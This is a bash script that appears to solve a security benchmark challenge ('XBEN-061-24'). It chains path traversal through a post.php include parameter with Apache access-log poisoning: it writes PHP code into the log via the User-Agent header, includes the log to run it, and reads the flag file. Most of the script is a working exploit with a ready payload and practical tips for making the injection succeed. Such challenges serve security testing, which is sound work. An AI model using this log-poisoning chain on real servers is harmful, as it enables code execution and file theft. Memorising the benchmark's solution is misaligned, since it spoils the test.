#!/usr/bin/env bash
# XBEN-061-24 — "Poision inclusion" (tags: lfi)
#
# `post.php?id=` includes `posts/<id>` with no filtering at all, so the
# traversal is plain. The obstacle is not reaching the file, it is that the flag
# file holds `<?php FLAG{…} ?>`: including it is a parse error and returns an
# empty page. It has to be read as text.
#
# The Dockerfile makes the Apache access log world-writable, which is the hint.
# Write PHP into it through the User-Agent, then include the log.
#
# Use single quotes in the payload. Apache escapes `"` in a logged User-Agent as
# `\"`, and a payload containing them lands as broken PHP that fatals every
# later include of the log — the target has to be restarted to clear it. That
# one detail cost this benchmark an hour before it was spotted in XBEN-079.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben061-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 \
    --set "header.User-Agent=<?php echo 'S:'.file_get_contents('/FLAG.php').':E'; die(); ?>" \
    --session "$SESSION" >/dev/null
REPLAY="$("$H5I" websec replay req_0 --create --set 'path=/post.php' \
    --set 'query.id=../../../../var/log/apache2/access.log' \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
